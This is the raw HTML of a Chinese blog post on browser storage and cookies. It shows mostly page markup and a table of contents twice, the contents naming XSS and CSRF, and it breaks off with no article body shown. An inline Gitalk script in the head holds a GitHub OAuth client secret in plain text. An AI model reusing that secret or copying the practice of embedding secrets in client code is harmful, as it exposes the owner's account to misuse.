<!DOCTYPE html>
<html><head>
<title>SessionStorage &amp; LocalStorage &amp; Cookie</title>




<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="description" content="浏览器缓存">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">



<meta property="og:title" content="SessionStorage &amp; LocalStorage &amp; Cookie" />
<meta property="og:description" content="浏览器缓存" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.openheart.icu/cs/sessionstorage%E5%92%8Clocalstorage%E5%92%8Ccookie/" />
<meta property="article:published_time" content="2020-07-25T11:42:23+00:00" />
<meta property="article:modified_time" content="2020-07-25T14:42:50+00:00" /><meta property="og:site_name" content="My Blog" />





<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SessionStorage &amp; LocalStorage &amp; Cookie"/>
<meta name="twitter:description" content="浏览器缓存"/>







<script src="/vendor/js/jquery.min.js" ></script>
<script src="/vendor/js/popper.min.js" ></script>
<script src="/vendor/js/bootstrap.min.js" ></script>
<script src="/vendor/js/smooth-scroll.polyfills.min.js" ></script>
<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
<link rel="shortcut icon" href="/images/smile_favicon.ico" type="image/x-icon" />
<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.css">
<script src="/vendor/js/vue.min.js" ></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>







<link rel="stylesheet" href="https://www.openheart.icu/scss/journal.min.501d7307b277cc4885da27e54d8eb3a01eb04a3eb1539d4db0f640bad47a803c.css" integrity="sha256-UB1zB7J3zEiF2iflTY6zoB6wSj6xU51NsPZAutR6gDw=" media="screen">



<link rel="stylesheet" href="https://www.openheart.icu/scss/dark-mode.min.7757e4001197b1cd1c03bf75eeef947c882e0bbc26b5096a3c1a66992f55521a.css" integrity="sha256-d1fkABGXsc0cA7917u&#43;UfIguC7wmtQlqPBpmmS9VUho=" media="screen">


<script src="https://www.openheart.icu//js/loadCSS.js"></script>

<script>
  loadCSS("https://fonts.googleapis.com/css?family=Lora|Montserrat|Fira+Mono|Noto+Serif+SC|Material+Icons");
</script>




  
    <script src="https://www.openheart.icu//js/toc-collapse.js"></script>

  



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script src="/vendor/js/md5.min.js"></script>
<script>
  var gitalk = new Gitalk({
  clientID: '78028e4d522031d4773c',
  clientSecret: 'e387ce8646bde4df55f81e9dc6c1e72b91248d82',
  repo: '42th-openheart',
  owner: 'Hyominn',
  admin: ['Hyominn'],
  id: md5(location.pathname),
  distractionFreeMode: 'false'
  });
  window.onload = function () {
        gitalk.render('gitalk-container')
  }
</script>








</head><body>
    	<div id="app"><div ref="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="https://www.openheart.icu/">
    
        <div class="nav-title">
            42th openheart
        </div>
        
        <div class="nav-subtitle">
            Kris Nie&#39;s Blog.
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/boom">
                Gossip
            </a>
            
        
            
            
            
                
            
            
            
            <a class="a-block nav-link-item active" href="/cs">
                ComputerScience
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/arithmetic">
                Arithmetic
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/about">
                About
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/categories">
                Categories
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/tags">
                Tags
            </a>
            
        
    </div>

    <div class="nav-footer">
        


<i class="fa fa-weixin" aria-hidden="true"></i>
Case42
<br>
<i class="fa fa-envelope" aria-hidden="true"></i>
krisnie42@gmail.com
<br>
<span id="busuanzi_container_site_pv">
    site pv:<span id="busuanzi_value_site_pv"></span>
</span>
| 
<span id="busuanzi_container_site_uv">
	site uv:<span id="busuanzi_value_site_uv"></span>
</span>
<br>
鲁ICP备20007116号
<br>
Powered by Hugo | Theme - <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a>

<br>


&copy;
	
	2020 ALL RIGHTS RESERVED KRIS NIE
	


    </div>
    
</div><div ref="extraContainer" class="extra-container">
    
    
    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windowsessionstorage" onclick="onNavClick(`#windowsessionstorage-nav`)" id="windowsessionstorage-nav">
									Window.sessionStorage
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e8%af%ad%e6%b3%95" onclick="onNavClick(`#语法-nav`)" id="语法-nav">
									语法
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e8%bf%94%e5%9b%9e%e5%80%bc" onclick="onNavClick(`#返回值-nav`)" id="返回值-nav">
									返回值
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%a4%ba%e4%be%8b" onclick="onNavClick(`#示例-nav`)" id="示例-nav">
									示例
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#windowlocalstorage" onclick="onNavClick(`#windowlocalstorage-nav`)" id="windowlocalstorage-nav">
									Window.localStorage
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e8%af%ad%e6%b3%95-1" onclick="onNavClick(`#语法-1-nav`)" id="语法-1-nav">
									语法
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e5%80%bc" onclick="onNavClick(`#值-nav`)" id="值-nav">
									值
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%bc%82%e5%b8%b8" onclick="onNavClick(`#异常-nav`)" id="异常-nav">
									异常
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#securityerror" onclick="onNavClick(`#securityerror-nav`)" id="securityerror-nav">
									SecurityError
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e7%a4%ba%e4%be%8b-1" onclick="onNavClick(`#示例-1-nav`)" id="示例-1-nav">
									示例
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e4%bd%bf%e7%94%a8-web-storage-api" onclick="onNavClick(`#使用-web-storage-api-nav`)" id="使用-web-storage-api-nav">
									使用 Web Storage API
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e5%9f%ba%e6%9c%ac%e6%a6%82%e5%bf%b5" onclick="onNavClick(`#基本概念-nav`)" id="基本概念-nav">
									基本概念
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#localstorage-%e5%8a%9f%e8%83%bd%e6%a3%80%e6%b5%8b" onclick="onNavClick(`#localstorage-功能检测-nav`)" id="localstorage-功能检测-nav">
									localStorage 功能检测
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e6%b5%8b%e8%af%95%e5%8f%af%e7%94%a8%e6%80%a7" onclick="onNavClick(`#测试可用性-nav`)" id="测试可用性-nav">
									测试可用性
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e4%b8%80%e4%b8%aa%e7%ae%80%e5%8d%95%e7%9a%84%e7%a4%ba%e4%be%8b" onclick="onNavClick(`#一个简单的示例-nav`)" id="一个简单的示例-nav">
									一个简单的示例
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e6%b5%8b%e8%af%95%e6%9c%ac%e5%9c%b0%e5%ad%98%e5%82%a8%e6%98%af%e5%90%a6%e5%b7%b2%e8%a2%ab%e5%a1%ab%e5%85%85" onclick="onNavClick(`#测试本地存储是否已被填充-nav`)" id="测试本地存储是否已被填充-nav">
									测试本地存储是否已被填充
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%8e%e5%ad%98%e5%82%a8%e4%b8%ad%e8%8e%b7%e5%8f%96%e5%80%bc" onclick="onNavClick(`#从存储中获取值-nav`)" id="从存储中获取值-nav">
									从存储中获取值
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%9c%a8%e5%ad%98%e5%82%a8%e4%b8%ad%e8%ae%be%e7%bd%ae%e5%80%bc" onclick="onNavClick(`#在存储中设置值-nav`)" id="在存储中设置值-nav">
									在存储中设置值
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e9%80%9a%e8%bf%87-storageevent-%e5%93%8d%e5%ba%94%e5%ad%98%e5%82%a8%e7%9a%84%e5%8f%98%e5%8c%96" onclick="onNavClick(`#通过-storageevent-响应存储的变化-nav`)" id="通过-storageevent-响应存储的变化-nav">
									通过 StorageEvent 响应存储的变化
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%88%a0%e9%99%a4%e6%95%b0%e6%8d%ae%e8%ae%b0%e5%bd%95" onclick="onNavClick(`#删除数据记录-nav`)" id="删除数据记录-nav">
									删除数据记录
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#http-cookies" onclick="onNavClick(`#http-cookies-nav`)" id="http-cookies-nav">
									HTTP cookies
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e5%88%9b%e5%bb%bacookie" onclick="onNavClick(`#创建cookie-nav`)" id="创建cookie-nav">
									创建Cookie
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#set-cookie%e5%93%8d%e5%ba%94%e5%a4%b4%e9%83%a8%e5%92%8ccookie%e8%af%b7%e6%b1%82%e5%a4%b4%e9%83%a8" onclick="onNavClick(`#set-cookie响应头部和cookie请求头部-nav`)" id="set-cookie响应头部和cookie请求头部-nav">
									Set-Cookie响应头部和Cookie请求头部
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%ae%9a%e4%b9%89-cookie-%e7%9a%84%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f" onclick="onNavClick(`#定义-cookie-的生命周期-nav`)" id="定义-cookie-的生命周期-nav">
									定义 Cookie 的生命周期
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%ae-cookie" onclick="onNavClick(`#限制访问-cookie-nav`)" id="限制访问-cookie-nav">
									限制访问 Cookie
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#cookie-%e7%9a%84%e4%bd%9c%e7%94%a8%e5%9f%9f" onclick="onNavClick(`#cookie-的作用域-nav`)" id="cookie-的作用域-nav">
									Cookie 的作用域
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#domain-%e5%b1%9e%e6%80%a7" onclick="onNavClick(`#domain-属性-nav`)" id="domain-属性-nav">
									Domain 属性
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#path-%e5%b1%9e%e6%80%a7" onclick="onNavClick(`#path-属性-nav`)" id="path-属性-nav">
									Path 属性
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#samesite-attribute" onclick="onNavClick(`#samesite-attribute-nav`)" id="samesite-attribute-nav">
									SameSite attribute
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#cookie-prefixes" onclick="onNavClick(`#cookie-prefixes-nav`)" id="cookie-prefixes-nav">
									Cookie prefixes
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#javascript-%e9%80%9a%e8%bf%87-documentcookie-%e8%ae%bf%e9%97%ae-cookie" onclick="onNavClick(`#javascript-通过-documentcookie-访问-cookie-nav`)" id="javascript-通过-documentcookie-访问-cookie-nav">
									JavaScript 通过 Document.cookie 访问 Cookie
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e5%ae%89%e5%85%a8" onclick="onNavClick(`#安全-nav`)" id="安全-nav">
									安全
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e4%bc%9a%e8%af%9d%e5%8a%ab%e6%8c%81%e5%92%8c-xss" onclick="onNavClick(`#会话劫持和-xss-nav`)" id="会话劫持和-xss-nav">
									会话劫持和 XSS
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e8%b7%a8%e7%ab%99%e8%af%b7%e6%b1%82%e4%bc%aa%e9%80%a0csrf" onclick="onNavClick(`#跨站请求伪造csrf-nav`)" id="跨站请求伪造csrf-nav">
									跨站请求伪造（CSRF）
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e8%b7%9f%e8%b8%aa%e5%92%8c%e9%9a%90%e7%a7%81" onclick="onNavClick(`#跟踪和隐私-nav`)" id="跟踪和隐私-nav">
									跟踪和隐私
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e7%ac%ac%e4%b8%89%e6%96%b9-cookie" onclick="onNavClick(`#第三方-cookie-nav`)" id="第三方-cookie-nav">
									第三方 Cookie
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#cookie-%e7%9b%b8%e5%85%b3%e8%a7%84%e5%ae%9a" onclick="onNavClick(`#cookie-相关规定-nav`)" id="cookie-相关规定-nav">
									Cookie 相关规定
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e7%a6%81%e6%ad%a2%e8%bf%bd%e8%b8%aa-do-not-track" onclick="onNavClick(`#禁止追踪-do-not-track-nav`)" id="禁止追踪-do-not-track-nav">
									禁止追踪 Do-Not-Track
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%ac%a7%e7%9b%9f-cookie-%e6%8c%87%e4%bb%a4" onclick="onNavClick(`#欧盟-cookie-指令-nav`)" id="欧盟-cookie-指令-nav">
									欧盟 Cookie 指令
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e5%83%b5%e5%b0%b8-cookie-%e5%92%8c%e5%88%a0%e4%b8%8d%e6%8e%89%e7%9a%84-cookie" onclick="onNavClick(`#僵尸-cookie-和删不掉的-cookie-nav`)" id="僵尸-cookie-和删不掉的-cookie-nav">
									僵尸 Cookie 和删不掉的 Cookie
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e5%9c%a8%e6%b5%8f%e8%a7%88%e5%99%a8%e4%b8%ad%e5%ad%98%e5%82%a8%e4%bf%a1%e6%81%af%e7%9a%84%e5%85%b6%e4%bb%96%e6%96%b9%e5%bc%8f" onclick="onNavClick(`#在浏览器中存储信息的其他方式-nav`)" id="在浏览器中存储信息的其他方式-nav">
									在浏览器中存储信息的其他方式
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%80%bb%e7%bb%93" onclick="onNavClick(`#总结-nav`)" id="总结-nav">
									总结
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#reference" onclick="onNavClick(`#reference-nav`)" id="reference-nav">
									Reference
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
    
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
        <a class="pagination-action" v-on:click="toggleDarkMode">
            <i class="material-icons pagination-action-icon" v-if="isDarkMode">
                brightness_4
            </i>
            <i class="material-icons pagination-action-icon" v-else="isDarkMode">
                brightness_7
            </i>
        </a>
        
        
    </div>
</div><div class="single-column-drawer-container" ref="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/boom">
                    Gossip
                </a>
                
            
                
                
                
                    
                
                
                
                <a class="a-block drawer-menu-item active" href="/cs">
                    ComputerScience
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/arithmetic">
                    Arithmetic
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/about">
                    About
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/categories">
                    Categories
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/tags">
                    Tags
                </a>
                
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windowsessionstorage" onclick="onNavClick(`#windowsessionstorage-nav`)" id="windowsessionstorage-nav">
									Window.sessionStorage
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e8%af%ad%e6%b3%95" onclick="onNavClick(`#语法-nav`)" id="语法-nav">
									语法
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e8%bf%94%e5%9b%9e%e5%80%bc" onclick="onNavClick(`#返回值-nav`)" id="返回值-nav">
									返回值
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%a4%ba%e4%be%8b" onclick="onNavClick(`#示例-nav`)" id="示例-nav">
									示例
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#windowlocalstorage" onclick="onNavClick(`#windowlocalstorage-nav`)" id="windowlocalstorage-nav">
									Window.localStorage
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e8%af%ad%e6%b3%95-1" onclick="onNavClick(`#语法-1-nav`)" id="语法-1-nav">
									语法
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e5%80%bc" onclick="onNavClick(`#值-nav`)" id="值-nav">
									值
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%bc%82%e5%b8%b8" onclick="onNavClick(`#异常-nav`)" id="异常-nav">
									异常
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#securityerror" onclick="onNavClick(`#securityerror-nav`)" id="securityerror-nav">
									SecurityError
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e7%a4%ba%e4%be%8b-1" onclick="onNavClick(`#示例-1-nav`)" id="示例-1-nav">
									示例
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e4%bd%bf%e7%94%a8-web-storage-api" onclick="onNavClick(`#使用-web-storage-api-nav`)" id="使用-web-storage-api-nav">
									使用 Web Storage API
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e5%9f%ba%e6%9c%ac%e6%a6%82%e5%bf%b5" onclick="onNavClick(`#基本概念-nav`)" id="基本概念-nav">
									基本概念
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#localstorage-%e5%8a%9f%e8%83%bd%e6%a3%80%e6%b5%8b" onclick="onNavClick(`#localstorage-功能检测-nav`)" id="localstorage-功能检测-nav">
									localStorage 功能检测
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e6%b5%8b%e8%af%95%e5%8f%af%e7%94%a8%e6%80%a7" onclick="onNavClick(`#测试可用性-nav`)" id="测试可用性-nav">
									测试可用性
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e4%b8%80%e4%b8%aa%e7%ae%80%e5%8d%95%e7%9a%84%e7%a4%ba%e4%be%8b" onclick="onNavClick(`#一个简单的示例-nav`)" id="一个简单的示例-nav">
									一个简单的示例
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e6%b5%8b%e8%af%95%e6%9c%ac%e5%9c%b0%e5%ad%98%e5%82%a8%e6%98%af%e5%90%a6%e5%b7%b2%e8%a2%ab%e5%a1%ab%e5%85%85" onclick="onNavClick(`#测试本地存储是否已被填充-nav`)" id="测试本地存储是否已被填充-nav">
									测试本地存储是否已被填充
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%8e%e5%ad%98%e5%82%a8%e4%b8%ad%e8%8e%b7%e5%8f%96%e5%80%bc" onclick="onNavClick(`#从存储中获取值-nav`)" id="从存储中获取值-nav">
									从存储中获取值
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%9c%a8%e5%ad%98%e5%82%a8%e4%b8%ad%e8%ae%be%e7%bd%ae%e5%80%bc" onclick="onNavClick(`#在存储中设置值-nav`)" id="在存储中设置值-nav">
									在存储中设置值
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e9%80%9a%e8%bf%87-storageevent-%e5%93%8d%e5%ba%94%e5%ad%98%e5%82%a8%e7%9a%84%e5%8f%98%e5%8c%96" onclick="onNavClick(`#通过-storageevent-响应存储的变化-nav`)" id="通过-storageevent-响应存储的变化-nav">
									通过 StorageEvent 响应存储的变化
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%88%a0%e9%99%a4%e6%95%b0%e6%8d%ae%e8%ae%b0%e5%bd%95" onclick="onNavClick(`#删除数据记录-nav`)" id="删除数据记录-nav">
									删除数据记录
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#http-cookies" onclick="onNavClick(`#http-cookies-nav`)" id="http-cookies-nav">
									HTTP cookies
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e5%88%9b%e5%bb%bacookie" onclick="onNavClick(`#创建cookie-nav`)" id="创建cookie-nav">
									创建Cookie
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#set-cookie%e5%93%8d%e5%ba%94%e5%a4%b4%e9%83%a8%e5%92%8ccookie%e8%af%b7%e6%b1%82%e5%a4%b4%e9%83%a8" onclick="onNavClick(`#set-cookie响应头部和cookie请求头部-nav`)" id="set-cookie响应头部和cookie请求头部-nav">
									Set-Cookie响应头部和Cookie请求头部
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%ae%9a%e4%b9%89-cookie-%e7%9a%84%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f" onclick="onNavClick(`#定义-cookie-的生命周期-nav`)" id="定义-cookie-的生命周期-nav">
									定义 Cookie 的生命周期
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e9%99%90%e5%88%b6%e8%ae%bf%e9%97%ae-cookie" onclick="onNavClick(`#限制访问-cookie-nav`)" id="限制访问-cookie-nav">
									限制访问 Cookie
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#cookie-%e7%9a%84%e4%bd%9c%e7%94%a8%e5%9f%9f" onclick="onNavClick(`#cookie-的作用域-nav`)" id="cookie-的作用域-nav">
									Cookie 的作用域
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#domain-%e5%b1%9e%e6%80%a7" onclick="onNavClick(`#domain-属性-nav`)" id="domain-属性-nav">
									Domain 属性
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#path-%e5%b1%9e%e6%80%a7" onclick="onNavClick(`#path-属性-nav`)" id="path-属性-nav">
									Path 属性
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#samesite-attribute" onclick="onNavClick(`#samesite-attribute-nav`)" id="samesite-attribute-nav">
									SameSite attribute
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#cookie-prefixes" onclick="onNavClick(`#cookie-prefixes-nav`)" id="cookie-prefixes-nav">
									Cookie prefixes
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#javascript-%e9%80%9a%e8%bf%87-documentcookie-%e8%ae%bf%e9%97%ae-cookie" onclick="onNavClick(`#javascript-通过-documentcookie-访问-cookie-nav`)" id="javascript-通过-documentcookie-访问-cookie-nav">
									JavaScript 通过 Document.cookie 访问 Cookie
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e5%ae%89%e5%85%a8" onclick="onNavClick(`#安全-nav`)" id="安全-nav">
									安全
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e4%bc%9a%e8%af%9d%e5%8a%ab%e6%8c%81%e5%92%8c-xss" onclick="onNavClick(`#会话劫持和-xss-nav`)" id="会话劫持和-xss-nav">
									会话劫持和 XSS
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e8%b7%a8%e7%ab%99%e8%af%b7%e6%b1%82%e4%bc%aa%e9%80%a0csrf" onclick="onNavClick(`#跨站请求伪造csrf-nav`)" id="跨站请求伪造csrf-nav">
									跨站请求伪造（CSRF）
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e8%b7%9f%e8%b8%aa%e5%92%8c%e9%9a%90%e7%a7%81" onclick="onNavClick(`#跟踪和隐私-nav`)" id="跟踪和隐私-nav">
									跟踪和隐私
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e7%ac%ac%e4%b8%89%e6%96%b9-cookie" onclick="onNavClick(`#第三方-cookie-nav`)" id="第三方-cookie-nav">
									第三方 Cookie
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#cookie-%e7%9b%b8%e5%85%b3%e8%a7%84%e5%ae%9a" onclick="onNavClick(`#cookie-相关规定-nav`)" id="cookie-相关规定-nav">
									Cookie 相关规定
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								<ul class="collapse" data-toggle="collapse">
							
						
						
							<li>
								<a href="#%e7%a6%81%e6%ad%a2%e8%bf%bd%e8%b8%aa-do-not-track" onclick="onNavClick(`#禁止追踪-do-not-track-nav`)" id="禁止追踪-do-not-track-nav">
									禁止追踪 Do-Not-Track
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%ac%a7%e7%9b%9f-cookie-%e6%8c%87%e4%bb%a4" onclick="onNavClick(`#欧盟-cookie-指令-nav`)" id="欧盟-cookie-指令-nav">
									欧盟 Cookie 指令
								</a>
							</li>
						
						
					
				
			
				
				
					
